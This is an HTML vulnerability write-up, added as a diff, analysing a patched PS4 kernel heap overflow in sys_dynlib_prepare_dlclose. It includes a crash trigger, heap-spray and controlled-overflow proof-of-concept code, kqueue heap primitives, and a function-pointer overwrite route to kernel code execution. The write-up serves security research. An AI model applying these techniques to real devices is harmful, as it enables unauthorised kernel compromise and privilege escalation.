@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+		<link rel="stylesheet" type="text/css" href="css/core.css" />
+		<title>Analysis of sys_dynlib_prepare_dlclose PS4 kernel heap overflow</title>
+	</head>
+	
+	<body>
+		<div class="page">
+			<div class="container">
+				<div class="header">
+					<a href="contact.html" class="header-element">
+						Contact
+					</a>
+					
+					<a href="skills.html" class="header-element">
+						Skills
+					</a>
+					
+					<a href="articles.html" class="header-element">
+						Articles
+					</a>
+					
+					<a href="index.html" class="header-element">
+						Home
+					</a>
+				</div>
+				
+				<h1>Analysis of <code>sys_dynlib_prepare_dlclose</code> PS4 kernel heap overflow</h1>
+				<h2> - <a href="cturt.github.io">CTurt</a> and <a href="http://blog.qwertyoruiop.com/">qwertyoruiop</a></h2>
+				
+				<hr>
+				
+				<h2>Introduction</h2>
+				<p>
+					I discovered a PS4 kernel vulnerability in a Sony system call a while ago, which I've recently had time exploit, with the help of <a href="http://blog.qwertyoruiop.com/">qwertyoruiop</a>. This vulnerability was patched at a similar time to BadIRET, around firmware 2.00, so it won't give access to any later firmwares; but I wanted to exploit and publish a write-up about it anyway, in the hope that the heap primitives used may be helpful for any future PS4 kernel exploits.
+				</p>
+				
+				<p>
+					As always, I will explain the full details of the vulnerability, and describe all methods of exploiting it which we considered, including the one which we used successfully. However, we're not interested in publishing any fully weaponised exploit source code.
+				</p>
+				
+				<br>
+				
+				<h2>Discovery</h2>
+				<p>
+					Back before I had the BadIRET kernel exploit working, I experimented with syscall fuzzing and found a few interesting crashes, the most promising of which was in system call 597. Since this was one of the few system calls I was able to preempt and read the call stack of, I was able to leak its name as <code>sys_dynlib_prepare_dlclose</code>:
+				</p>
+				
+				<pre><code>#0 0xffffffff8243f6dc at mi_switch+0xbc
+#1 0xffffffff824740aa at sleepq_timedwait+0x3a
+#2 0xffffffff8243f2cb at _sleep+0x24b
+#3 0xffffffff825ab6e1 at kmem_malloc+0x1d1
+#4 0xffffffff825a40f4 at uma_large_malloc+0x44
+#5 0xffffffff8242277b at malloc+0x11b
+#6 0xffffffff825e809d at rtld_malloc+0x1d
+#7 0xffffffff825e380e at sys_dynlib_prepare_dlclose+0x7e
+#8 0xffffffff82616735 at amd64_syscall+0x4c5
+#9 0xffffffff825ff357 at Xfast_syscall+0xf7</code></pre>
+				
+				<p>
+					The following usage of this system call will cause a panic:
+				</p>
+				
+				<pre><code>uint64_t count = 0x800000000;
+dynlib_prepare_dlclose(1, NULL, &count);</code></pre>
+				
+				<p>
+					The interesting thing about this panic was that it didn't happen immediately; the current thread froze whilst the rest of the system remained stable for about 30 seconds before a kernel panic occurred.
+				</p>
+				
+				<p>
+					From the call stack, I at least knew that a memory allocation was being performed, and probably with a user supplied length. So I decided to keep quiet about the bug until I had analysed it fully, and knew that it had been patched.
+				</p>
+				
+				<br>
+				
+				<h2>Analysis</h2>
+				<p>
+					After dumping the kernel with the <a href="ps4-2.html">BadIRET exploit</a>, I've been able to audit the system call and analyse the exact nature of the bug.
+				</p>
+				
+				<p>
+					This system call is part of a dynamic linker which Sony added to the kernel, which appears to be heavily based on FreeBSD's userland <a href="https://www.freebsd.org/cgi/man.cgi?query=rtld&apropos=0&sektion=1&manpath=FreeBSD+9.0-RELEASE&arch=amd64&format=html"><code>rtld-elf</code></a>.
+				</p>
+				
+				<p>
+					The main design change from userland <code>rtld-elf</code> is that each process holds a pointer to its main executable object, within its structure (<code>td->td_proc->dl_context->first_obj</code>).
+				</p>
+				
+				<p>
+					In particular, the PS4 function <code>prepare_dlclose</code> is heavily based on FreeBSD's <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/libexec/rtld-elf/rtld.c#L2078"><code>dlclose</code></a> which basically checks whether the requested library has any references (<code>root->refcount == 1</code>), to see if the requested library can be unloaded.
+				</p>
+				
+				<p>
+					Sony's <code>prepare_dlclose</code> is a slight extension to this. It essentially iterates over a linked list of all objects loaded by the process, to produce a list of these references, before it performs the check, and then unloading if necessary.
+				</p>
+				
+				<p>
+					To help with reverse engineering this code, the <code>dump_obj</code> and <code>dump_objlist</code> functions can be very helpful because they give you the offsets of the most useful members of the <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/libexec/rtld-elf/rtld.h#L136"><code>Obj_Entry</code> structure</a> and the <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/libexec/rtld-elf/rtld.h#L78"><code>Objlist</code> structure</a>.
+				</p>
+				
+				<br>
+				
+				<h2>The bug</h2>
+				<p>
+					At its fundamental core, the system call does the following:
+				</p>
+				
+				<pre><code>struct dynlib_prepare_dlclose_args {
+	int handle;
+	int *buffer;
+	uint64_t *countAddress;
+};
+
+int64_t sys_dynlib_prepare_dlclose(struct thread *td, struct dynlib_prepare_dlclose_args *uap) {
+	int64_t count;
+	int *allocation;
+	struct dl_context *context;
+	Obj_Entry *obj;
+	int result = 0;
+	
+	...
+	
+	context = td->td_proc->dl_context;
+	...
+	if(!copyin(uap->countAddress, &count, sizeof(count))) {
+		...
+		allocation = rtld_malloc(count * sizeof(int), 0);
+		...
+		if(allocation) {
+			copyin(uap->buffer, allocation, sizeof(int) * count);
+			...
+			obj = find_obj_by_handle(context, uap->handle);
+			
+			...
+			
+			if(!prepare_dlclose(context, obj, allocation, &count)) {
+				if(!copyout(allocation, uap->buffer, 4 * count)) {
+					if(copyout(&count, uap->countAddress, sizeof(count))) result = EFAULT;
+				}
+				
+				else result = EFAULT;
+			}
+			else result = EINVAL;
+			
+			...
+			
+			rtld_free(allocation, size, 0);
+		}
+	}
+	else result = EFAULT;
+	
+	return result;
+}</code></pre>
+				
+				<p>
+					One problem is that although the result from the first <code>copyin</code> is checked, the second <code>copyin</code> isn't. This could potentially be used as an info leak, which might have been useful if the PS4 kernel had ASLR, but since not, we had no need to analyse this fully.
+				</p>
+				
+				<p>
+					However, the main problems pertain from there being no bound checks performed on the user supplied count, resulting in multiple parts of this system call being vulnerable to classic integer overflows.
+				</p>
+				
+				<br>
+				
+				<h2>FreeBSD kernel heap allocation types</h2>
+				<p>
+					There are 2 different ways to get the size of the allocation to overflow, giving us either a zone allocation, or a page based allocation.
+				</p>
+				
+				<p>
+					The allocation is done by <code>rtld_malloc</code>, which is almost a direct wrapper for <code>malloc</code>. In the FreeBSD kernel <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_malloc.c#L419"><code>malloc</code></a> implementation, different functions will be used depending on whether size > <code>KMEM_ZMAX</code> or not (<code>0x1000</code> on FreeBSD, <code>0x4000</code> on PS4):
+				</p>
+				
+				<pre><code>if(size <= KMEM_ZMAX) {
+	...
+	// Perform a zone allocation
+	va = uma_zalloc(zone, flags);
+	...
+}
+else {
+	...
+	// Physically allocate new pages
+	va = uma_large_malloc(size, flags);
+	...
+}</code></pre>
+				
+				<p>
+					When small allocations are requested, the zone allocator will search for gaps in pre-allocated zones. When larger allocations are requested, the system will attempt to physically allocate new pages.
+				<p>
+				
+				<br>
+				
+				<h2>The first integer overflow</h2>
+				<p>
+					Since the size is stored as a 64bit unsigned integer, the most obvious overflow occurs when <code>0x4000000000000000 + X</code> is passed in as count. This would calculate a size of <code>(0x4000000000000000 + X) * 4 = 0x10000000000000000 + X * 4</code> to be passed to <code>rtld_malloc</code>, which overflows to simply <code>X * 4</code> bytes.
+				</p>
+				
+				<p>
+					Depending on the value of <code>X</code>, this can be used to trigger either zone allocations or physical allocations.
+				</p>
+				
+				<br>
+				
+				<h2>The second integer overflow</h2>
+				<p>
+					Since <code>uma_large_malloc</code> declares the size parameter as <code>vm_size_t</code>, which is a 32bit type, we can get the size to overflow at a later stage of the allocation.
+				</p>
+				
+				<p>
+					When a count of <code>0x400000000 + X</code> is specified, the calculated size will be <code>(0x400000000 + X) * 4 = 0x1000000000 + X * 4</code> bytes.
+				</p>
+				
+				<p>
+					This can be stored in a 64bit integer, so the size won't have overflown by the time the code path performs the size check for a zone allocation or a physical allocation. This means the <code>uma_large_malloc</code> will always be used.
+				</p>
+				
+				<p>	
+					When this size is passed down to <code>uma_large_malloc</code> it will be truncated to 32bit, and overflow to simply <code>X * 4</code> bytes.
+				</p>
+				
+				<p>
+					The <code>uma_zalloc</code> code path also treats size as a 32bit type, but since we are interested in getting a size large enough to overflow when truncated, this isn't reachable by us.
+				</p>
+				
+				<br>
+				
+				<h2>Attack vectors for the first overflow</h2>
+				<p>
+					After allocating a buffer with an overflowed size, the code then goes on to call <code>prepare_dlclose</code> with this buffer and our controlled count <i>before</i> it has overflowed. The situation now is that only <code>X * 4</code> bytes have been allocated for the buffer, but the count passed onto <code>prepare_dlclose</code> will be <code>0x4000000000000000 + X</code>.
+				</p>
+				
+				<p>
+					As explained earlier, when the reference count of the library is 1, <code>prepare_dlclose</code> will call <code>objlist_prepare_fini</code> to fill the buffer with a list of references to the requested library:
+				</p>
+				
+				<pre><code>int64_t prepare_dlclose(struct dl_context *context, Obj_Entry *root, void *alloc, int64_t *count) {
+	...
+	if(root->refcount == 1) {
+		objlist_prepare_fini(context, &context->list, root, alloc, count);
+		...
+	}
+	...
+}</code></pre>
+				
+				<p>
+					It is in <code>objlist_prepare_fini</code> that the buffer is finally written to, giving us an out of bounds kernel heap write:
+				</p>
+				
+				<pre><code>signed int64_t objlist_prepare_fini(struct dl_context *context, Objlist_Entry *list, Obj_Entry *root, int *buffer, int64_t *count) {
+	...
+	buffer[i] = nextList->obj->handle;
+	...
+}</code></pre>
+				
+				<p>
+					The problem with trying to exploit this situation is that the particular code path where the buffer is written to is very specific.
+				</p>
+				
+				<p>
+					The first condition that must be satisfied is for <code>root->refcount</code> to equal 1, so that <code>prepare_dlclose</code> will call <code>objlist_prepare_fini</code>. This is trivial to bypass: if we manually load a new library it will have both a <code>refcount</code> and <code>dl_refcount</code> of 1.
+				</p>
+				
+				<p>
+					But the next condition is more difficult to control:
+				</p>
+				
+			<pre><code>i = 0;
+while(1) {
+	nextList = list->next;
+	
+	while(1) {
+		if(!nextList) {
+			*count = i;
+			return 0;
+		}
+		
+		obj = nextList->obj;
+		
+		if(!root)
+			break;
+		
+		if(obj->refcount == 1) {
+			LODWORD(v11) = sub_FFFFFFFF825E5C30(&root->unk, nextList->obj);
+			if(v11)
+				break;
+		}
+		
+		nextList = nextList->next;
+	}
+}</code></pre>
+				
+				<p>
+					To prevent the function from returning before the heap write, we need <code>td->td_proc->dl_context->list->next</code> to be non-<code>NULL</code>. We experimented with several ideas to attempt to populate the list: mainly loading and unloading all libraries in different orders, but didn't have any success.
+				</p>
+				
+				<br>
+				
+				<h2>Attack vectors for the second overflow</h2>
+				<p>
+					Of course, both methods of triggering the allocation size overflow will theoretically give access to the out of bounds write in <code>objlist_prepare_fini</code>, but getting the size to overflow the second way also gives us some additional potential attack vectors.
+				</p>
+				
+				<br>
+				
+				<h3><code>rtld_free</code></h3>
+				<p>
+					When the allocation is freed with <code>rtld_free</code> at the end of the system call, the full 64bit size will be passed.
+				</p>
+				
+				<p>
+					At first this looks like it could lead to some very juicy use after free behaviour because only <code>X * 4</code> bytes will have been allocated, but the system call will try to free <code>0x1000000000 + X * 4</code> bytes. Unfortunately, although the <code>rtld_free</code> function is passed the full size, the code doesn't appear to use the size argument at all, so this isn't a possible attack vector.
+				</p>
+				
+				<br>
+				
+				<h3><code>copyin</code> overflow</h3>
+				<p>
+					The next thing we experimented with, was abusing the <code>copyin</code> performed early on by <code>sys_dynlib_prepare_dlclose</code>:
+				</p>
+				
+				<pre><code>allocation = rtld_malloc(count * 4, 0);
+...
+copyin(uap->buffer, allocation, 4 * count);</code></pre>
+				
+				<p>
+					Once again, if we supply a count of <code>0x400000000 + X</code>, the size for the allocation will be truncated by <code>uma_large_malloc</code>, resulting in an allocation of only <code>X * 4</code> bytes.
+				</p>
+				
+				<p>
+					However, the size parameter for <code>copyin</code> is treated as 64bit, so the full size will be used. This gives us a heap overflow of <code>copyLength - bufferSize = ((0x400000000 + X) * 4) - (X * 4) = 0x1000000000</code> bytes.
+				</p>
+				
+				<p>
+					There is a clear problem here: overflowing by 4GB is much more than we can handle! However, there are two potential ways for a copy to be interrupted:
+				</p>
+				
+				<p>
+					The system call could be preempted whilst overflowing the buffer, and another userland thread could then kill it to stop the overflow from completing its full size (I've demonstrated a similar idea in my <a href="ps4-3.html">third PS4 article</a>, where I preempted kernel threads to read their call stacks from userland). Whilst this would result in a smaller overflow, it still wouldn't be managable because we wouldn't be able to control exactly when the copy would be preempted.
+				</p>
+				
+				<p>
+					The other way of interrupting the overflow would be to setup userland memory such that the page after the mapping is unmapped. Once the system has copied all memory we desire, it will then attempt to copy from the unmapped memory following it, resulting in a page fault being triggered, and the system call cancelling, with <code>EFAULT</code> returned. This gives us a reliable way of controlling the size of the copy, aligned to one page.
+				</p>
+				
+				<br>
+				
+				<h2>Debugging on FreeBSD</h2>
+				<p>
+					It should be clear now that the <code>copyin</code> call is the easiest way to exploit the bug since it is possible to control both the size and contents of the overflow. Since I haven't yet been able to get kernel debugging on a retail PS4 (don't feel like soldering to the UART ports), we debugged the exploit on FreeBSD first.
+				</p>
+				
+				<p>
+					Although I've described the process of debugging the FreeBSD kernel in <a href="ps4-3.html">my previous article</a>, there are some additional things we will need to adjust to debug an exploit for this particular vulnerability.
+				</p>
+				
+				<p>
+					Since the vulnerability is a heap overflow, we rely heavily on the behaviour of <code>PAGE_SIZE</code>, which is 4KB by default on FreeBSD, but 16KB on PS4. To adjust the page size to be 16KB: modify <code>PAGE_SHIFT</code> from 12 to 14 in file <code>sys/amd64/include/param.h</code> and recompile the kernel.
+				</p>
+				
+				<p>
+					We'll also need to create a kernel module, with a new system call to replicate the behaviour we need from <code>sys_dynlib_prepare_dlclose</code>:
+				</p>
+				
+				<pre><code>int sys_backdoor(struct thread *td, struct backdoor_args *uap) {
+	char *x = malloc(uap->a, M_FOOBUF, 0);
+	copyin(uap->b, x, uap->a);
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<h2>Controlling the overflow</h2>
+				<p>
+					All that is needed is to prepare the following heap layouts:
+				</p>
+				
+				<pre><code>Userland: [     Mapping    ][Unmapped]
+Kernel:   [Buffer][Overflow]</code></pre>
+				
+				<p>
+					When the system call is performed the following will happen:
+				</p>
+				
+				<ul>
+					<li>Arbitrary contents will be copied into the kernel buffer from the controlled userland mapping,</li>
+					<li>The kernel memory after the allocated buffer will be overflowed into, with our controlled userland mapping,</li>
+					<li>The <code>copyin</code> will attempt to read from unmapped userland memory,</li>
+					<li>A page fault will be triggered, and the system call will return <code>EFAULT</code>,</li>
+				</ul>
+				
+				<br>
+				
+				<h2>Preparing the heap</h2>
+				<h3>Userland</h3>
+				<p>
+					To ensure that the end of our buffer is unmapped, we can simply map the size we need plus one additional page, and then unmap the additional page:
+				</p>
+				
+				<pre><code>uint64_t bufferSize = 0x8000;
+uint64_t overflowSize = 0x8000;
+
+uint64_t mappingSize = bufferSize + overflowSize;
+
+int64_t count = (0x100000000 + bufferSize) / 4;
+
+uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+munmap(mapping + mappingSize, PAGE_SIZE);</code></pre>
+				
+				<br>
+				
+				<h3>Kernel</h3>
+				<p>
+					Luckily for us, the kernel heap allocator has predictable behaviour, which we can use to manipulate its layout.
+				</p>
+				
+				<p>
+					For instance, when trying to allocate <code>0x100000000</code> bytes with <code>rtld_malloc</code>, since the size will truncate to 0, and a special case occurs: the start of the heap (<code>0xffffff8000400000</code>) will always be returned. This could be used to target the start of the heap if it contained a viable attack vector.
+				</p>
+				
+				<p>
+					In reality, we will need to use a more advanced technique, known as <a href="https://en.wikipedia.org/wiki/Heap_feng_shui">Heap Feng Shui</a>. The principle of this is that since the heap is deterministic, we can reliably manipulate its layout with specific sequences of allocations and frees.
+				</p>
+				
+				<p>
+					We used kernel code execution from the BadIRET exploit to test the behaviour of the heap. We found that after spraying 100 dummy allocations to ensure that the next two allocations will be adjacent, and then freeing the first allocation, the next allocation will occupy its memory:
+				</p>
+				
+				<pre><code>/* Sample output:
+Alloc spray
+...
+Alloc first
+ffffff8002450000
+Alloc second
+ffffff8002458000
+Free first
+New alloc
+ffffff8002450000
+*/
+
+kprintf("Alloc spray\n");
+int i;
+for(i = 0; i < 100; i++) {
+	void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+	kprintf("%p\n", m);
+}
+
+kprintf("Alloc first\n");
+void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+kprintf("%p\n", m);
+
+kprintf("Alloc second\n");
+void *m2 = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+kprintf("%p\n", m2);
+
+kprintf("Free first\n");
+free(m, &M_SUBPROC);
+
+kprintf("New alloc\n");
+void *n = rtld_malloc(0x100000000 + 0x8000, 0);
+kprintf("%p\n", n);</code></pre>
+				
+				<br>
+				
+				<h2>Controlled overflow PoC</h2>
+				<p>
+					We now know everything about the heap's behaviour that we need to write a controlled overflow PoC:
+				</p>
+				
+				<pre><code>// Prepare heap layout - kernel:
+kprintf("Alloc spray\n");
+int i;
+for(i = 0; i < 100; i++) {
+	void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+	kprintf("%p\n", m);
+}
+
+kprintf("Alloc first\n");
+void *m = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+kprintf("%p\n", m);
+
+kprintf("Alloc second\n");
+void *m2 = malloc(0x8000, &M_SUBPROC, M_WAITOK | M_ZERO);
+kprintf("%p\n", m2);
+
+kprintf("Free first\n");
+free(m, &M_SUBPROC);
+
+
+// Perform oveflow - userland:
+uint64_t bufferSize = 0x8000;
+uint64_t overflowSize = 0x8000;
+
+uint64_t mappingSize = bufferSize + overflowSize;
+
+int64_t count = (0x100000000 + bufferSize) / 4;
+
+uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+munmap(mapping + mappingSize, PAGE_SIZE);
+
+memset(mapping + bufferSize, 'a', mappingSize);
+
+int result = syscall(597, 1, mapping, &count);
+printf("Result: %d\n", result);
+
+
+// Dump second allocation - kernel:
+memcpy(dump, m2, 0x8000);
+
+struct sendto_args args = { sock, dump, 0x8000, 0, NULL, 0 };
+sendto(td, &args);</code></pre>
+				
+				<p>
+					Sure enough, the two allocations are adjacent, the system call returns <code>EFAULT</code>, the second buffer is overwritten with "<code>aaa...</code>", and the system remains stable (since we only overwrote into our controlled mapping).
+				</p>
+				
+				<br>
+				
+				<h2>Kernel heap primitives</h2>
+				<p>
+					Now that we've been able to reliably control the overflow within our artificial kernel code tests, we need to find a piece of existing kernel code which we can trigger from userland to replicate the behaviour.
+				</p>
+				
+				<p>
+					We need something large enough to be allocated using <code>uma_large_malloc</code> (not the zone allocator), and ideally we should have some control over its size.
+				</p>
+				
+				<p>
+					Although there are several pieces of kernel code, easily accessible from userland, which can be used to perform kernel heap allocations, many aren't suitible as primitives for our exploit. For example, <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_uuid.c#L190"><code>sys_uuidgen</code></a> can be used to allocate up to <code>2048 * 16 = 0x8000</code> bytes, but the buffer is almost immediately freed so it would have to be race attacked, which wouldn't be practical.
+				</p>
+				
+				<p>
+					Eventually, we came across an allocation in the kernel event queue handling code, in <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_event.c#L1239"><code>kqueue_expand</code></a>:
+				</p>
+				
+				<pre><code>size = kq->kq_knlistsize;
+while(size <= fd)
+	size += KQEXTENT;
+list = malloc(size * sizeof(*list), M_KQUEUE, mflag);</code></pre>
+				
+				<p>
+					This allocation is perfect because the size used is derived from the file descriptor number, not the number of files.
+				</p>
+				
+				<p>
+					Using this, we were able to create heap allocation and free primitives in FreeBSD, with size controlled to any multiples of <code>0x800</code> bytes:
+				</p>
+				
+				<pre><code>// Perform kernel allocation aligned to 0x800 bytes
+int kernelAllocation(size_t size) {
+	struct kevent kv;
+	int queue = kqueue();
+	
+	int fd = (size - 0x800) / 8;
+	
+	
+	// Assuming dup2 is allowed
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	dup2(sock, fd);
+	close(sock);
+	
+	
+	EV_SET(&kv, fd, EVFILT_READ, EV_ADD, 0, 5, NULL);
+	kevent(queue, &kv, 1, 0, 0, 0);
+	
+	close(fd);
+	
+	return queue;
+}
+
+void kernelFree(int allocation) {
+	close(allocation);
+}
+
+int main(void) {
+	int allocation = kernelAllocation(PAGE_SIZE * 4);
+	kernelFree(allocation);
+	
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<h2>Porting heap primitives to PS4</h2>
+				<p>
+					There are several complications which need to be addressed to port the above FreeBSD heap primitives to PS4.
+				</p>
+				
+				<br>
+				
+				<h3>File descriptor raising on PS4</h3>
+				<p>
+					One of these complications is that we depend on <a href="https://www.freebsd.org/cgi/man.cgi?query=dup2&apropos=0&sektion=2&manpath=FreeBSD+9.0-RELEASE&arch=amd64&format=html"><code>dup2</code></a> to raise the file descriptor number, but since Sony has added a <code>priv_check</code> on this system call (and all varients like <code>dup</code> and <code>rdup</code>), we can't use it.
+				</p>
+				
+				<p>
+					One solution to this would be to simply keep creating files (like sockets or pipes) until we reach the desired file descriptor number. However, there is a <code>sysctl</code> name, <code>"kern.maxfiles"</code>, which limits the amount of descriptors we can create (set to <code>0x3680</code> on PS4); this would place a limit on the size of the allocations we could perform.
+				</p>
+				
+				<p>
+					Fortunately, there is a slight difference between how file descriptors are allocated on FreeBSD and PS4 which renders the protection of <code>dup2</code> moot. Consider the below example:
+				</p>
+				
+				<pre><code>int sock = socket(AF_INET, SOCK_STREAM, 0);
+printf("sock: %d\n", sock);
+close(sock);
+sock = socket(AF_INET, SOCK_STREAM, 0);
+printf("sock: %d\n", sock);</code></pre>
+				
+				<p>
+					On FreeBSD, (ignoring the possibilities of multi-threading), the two values of <code>sock</code> would be the same. But on the PS4, we will keep getting higher file descriptor numbers, even after closing them (the second value of <code>sock</code> will be 1 higher than the first).
+				</p>
+				
+				<p>
+					So to achieve high file descriptor numbers, without using the blocked <code>dup2</code>, we can simply do:
+				</p>
+				
+				<pre><code>static int sock = 0;
+
+if(sock != fd) {
+	while(1) {
+		sock = socket(AF_INET, SOCK_STREAM, 0);
+		if(sock == fd) break;
+		
+		close(sock);
+	}
+}</code></pre>
+				
+				<br>
+				
+				<h3>File descriptor target number</h3>
+				<p>
+					For FreeBSD, the target file descriptor needed for an allocation of <code>size</code> bytes is equal to <code>(size - 0x800) / 8</code>.
+				</p>
+				
+				<p>
+					Attempting to use the same calculation for PS4 will allocate sizes approximately 4 times larger than desired. It is possible to discover the correct calculation for target file descriptor just by experimentation, without a kernel dump.
+				</p>
+				
+				<br>
+				
+				<h3>Event queue differences on PS4</h3>
+				<p>
+					Although <code>struct kevent</code> is 32 bytes for both systems, some of the offsets of the members are different due to struct padding (<code>filter</code> has offset 8 on FreeBSD, but 4 on PS4).
+				</p>
+				
+				<p>
+					An easy way to deal with these differences is just to use the Sony wrappers in <code>libkernel</code>, (like <code>sceKernelCreateEqueue</code> and <code>sceKernelAddUserEvent</code>), which construct the <code>kevent</code> struct for you.
+				</p>
+				
+				<br>
+				
+				<h2>Targets to overflow into</h2>
+				<p>
+					The beautiful thing about the heap control primitive explained above, is that not only is it useful for performing heap layout manipulations, but its allocations also contain a linked list (<code>kq->kq_knlist</code>) which we can overflow into.
+				</p>
+				
+				<p>
+					To achieve kernel code execution, there is no actually no need to gain arbitrary kernel write first. If you look at <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/sys/event.h#L138"><code>struct knlist</code></a> itself, it is filled with function pointers:
+				</p>
+				
+				<pre><code>struct knlist {
+	struct klist kl_list;
+	void (*kl_lock)(void *);	/* lock function */
+	void (*kl_unlock)(void *);
+	void (*kl_assert_locked)(void *);
+	void (*kl_assert_unlocked)(void *);
+	void *kl_lockarg;		/* argument passed to kl_lockf() */
+};</code></pre>
+				
+				<p>
+					So, all we need to do is overflow the <code>kn_knlist</code> member of <code>struct knote</code> with a pointer to a controlled list, which contains function pointers aimed at our payload.
+				</p>
+				
+				<br>
+				
+				<h2>Triggering</h2>
+				<p>
+					After the buffers have been overflown, closing the queue will trigger the <code>kl_lock</code> function pointer, resulting in a jump to our payload. Kernel code execution achieved!
+				</p>
+				
+				<br>
+				
+				<h2>Conclusion</h2>
+				<p>
+					Kernel code execution gives almost complete control over the system. I've described in <a href="ps4-3.html">my previous article</a> a few things you can experiment with: dumping the kernel, disabling CPU write protection to make patches to kernel code, reading and writing memory of other processes, privilege escalation, breaking out of FreeBSD jail, escaping sandbox and gaining full access to the file system, and I've also hinted at a few other things you can try: decrypting saves, and dumping the registry.
+				</p>
+				
+				<p>
+					However, with the recent release of <a href="https://github.com/fail0verflow/ps4-linux">fail0verflow's PS4 Linux port</a>, kernel exploits will soon be useful for end users, as well as for developers.
+				</p>
+			</div>
+		</div>
+	</body>
+</html>
